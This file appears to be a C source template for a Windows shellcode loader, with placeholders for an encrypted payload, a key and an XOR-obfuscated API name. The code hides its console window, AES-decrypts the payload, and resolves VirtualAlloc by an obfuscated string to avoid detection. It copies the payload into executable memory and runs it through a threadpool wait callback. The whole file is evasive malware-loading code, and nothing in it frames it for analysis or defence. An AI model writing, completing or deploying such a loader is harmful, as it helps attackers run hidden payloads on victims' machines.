#include <windows.h>
#include <threadpoolapiset.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

char XOR_VARIABLE []= "XOR_KEY";

unsigned char Random9 []= VIRALO}; 


int Random1(char * Random2, unsigned int Random2_len, char * Random3, size_t Random3len) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)Random3, (DWORD)Random3len, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
         
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, Random2, &Random2_len)){
                return -1;
        }
         
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

void RandomA(char * tada, int tada_len, char * XOR_VARIABLE, size_t XOR_VARIABLE_len) {
        int r;
        r = 0;
        for (int i = 0; i < tada_len; i++) {
                if (r == XOR_VARIABLE_len - 1) r = 0;

                tada[i] = tada[i] ^ XOR_VARIABLE[r];
                r++;
        }
}


int main() { 
        BOOL rv;
        HANDLE th;
    DWORD oldprotect = 0;
        
        char Random3 []=KEYVALUE 
        unsigned char Random2[]=PAYVAL 

        unsigned int Random2_len = sizeof(Random2);
        FreeConsole();
        Random1((char *) Random2, Random2_len, Random3, sizeof(Random3));
        
        HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
        
        RandomA((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
	Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), Random9);	
        
        LPVOID Random2Address = Virt_Alloc(NULL, sizeof(Random2), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        RtlMoveMemory(Random2Address, Random2, sizeof(Random2));

        PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)Random2Address, NULL, NULL);
        SetThreadpoolWait(threadPoolWait, event, NULL);
        WaitForSingleObject(event, INFINITE);
        
        return 0;
}

